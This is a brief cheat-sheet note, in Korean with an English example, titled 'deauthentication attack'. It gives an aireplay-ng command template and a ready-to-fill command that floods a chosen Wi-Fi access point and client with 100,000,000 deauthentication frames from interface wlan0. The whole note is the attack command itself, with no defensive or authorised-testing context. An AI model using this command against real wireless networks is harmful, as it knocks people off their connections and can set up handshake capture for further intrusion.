# deauthentication attack (연결 해제 공격)

```sh
# aireplay-ng --deauth [패킷수] -a [접속점_mac주소] -c [클라이언트_mac주소] [인터페이스]

aireplay-ng --deauth 100000000 -a [access_point_macaddress] -c [client_macaddress] wlan0
```
